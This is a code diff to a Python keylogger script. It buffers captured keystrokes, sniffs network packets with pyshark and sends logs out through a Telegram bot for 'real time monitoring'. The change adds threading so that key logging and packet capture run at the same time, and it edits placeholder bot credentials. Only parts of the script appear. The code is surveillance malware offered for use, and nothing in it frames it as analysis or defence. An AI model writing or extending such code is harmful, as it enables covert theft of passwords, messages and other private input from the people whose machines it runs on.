@@ -3,6 +3,7 @@ import time
 import requests
 import pyshark
 import asyncio
+import threading
 
 # instead of email, use telegram instead for real time monitoring
 def send_to_telegram(token, chat_id, message):
@@ -14,8 +15,8 @@ def send_to_telegram(token, chat_id, message):
         print(f"Error sending message to Telegram: {e}")
 
 # add telegram bot detail here
-TELEGRAM_TOKEN = "BOT TOKEN HERE"
-CHAT_ID = "CHAT ID HERE"
+TELEGRAM_TOKEN = "INSERT BOT TOKEN HERE"
+CHAT_ID = "INSERT CHAT ID HERE"
 
 # buffer to store key logs to increase performance
 log_buffer = []
@@ -75,7 +76,14 @@ def capture_packets():
         print(f"Error starting capture: {e}")
 
 if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=key_pressed)
-    listener.start()
-    listener.join()  
+    # thread 1 for logging key
+    keylogger_thread = threading.Thread(target=lambda: keyboard.Listener(on_press=key_pressed).start())
+    keylogger_thread.start()
 
+    # thread 2 for network capture/monitoring
+    packet_capture_thread = threading.Thread(target=capture_packets)
+    packet_capture_thread.start()
+
+    # join the threads
+    keylogger_thread.join()
+    packet_capture_thread.join()
